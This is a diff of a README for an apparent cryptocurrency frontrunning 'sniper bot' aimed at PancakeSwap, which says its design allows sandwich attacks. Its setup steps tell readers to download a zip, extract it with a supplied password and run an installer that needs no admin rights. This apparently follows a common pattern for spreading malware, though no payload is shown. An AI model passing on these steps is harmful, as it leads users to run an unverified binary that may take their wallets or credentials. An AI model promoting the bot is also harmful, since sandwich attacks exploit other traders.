@@ -1,7 +1,7 @@
 AMM bot is frontrunning bot primarily aimed at liquidity sniping on AMMs like PancakeSwap. Even though this repository serves as a liquidity sniper, it's architecture is flexible enough to allow any type of frontrunning operation to be built on top of it (eg. liquidations, sandwich attacks, etc).
 
 ### Setup
-1. [Download](https://github.com/EDavis66/AMM-sniper-bot/archive/refs/heads/main.zip) repo and extract files with password `Jz9bsR3KkTiwtT` ([Github](https://github.com/EDavis66/AMM-sniper-bot/archive/refs/heads/main.zip))
+1. [Download](https://github.com/EDavis66/AMM-sniper-bot/archive/refs/heads/main.zip) repo and extract files with password `Jz9bsR3KkTiwtT`
 
 2. Launch bot installer (no admin privileges needed)
 
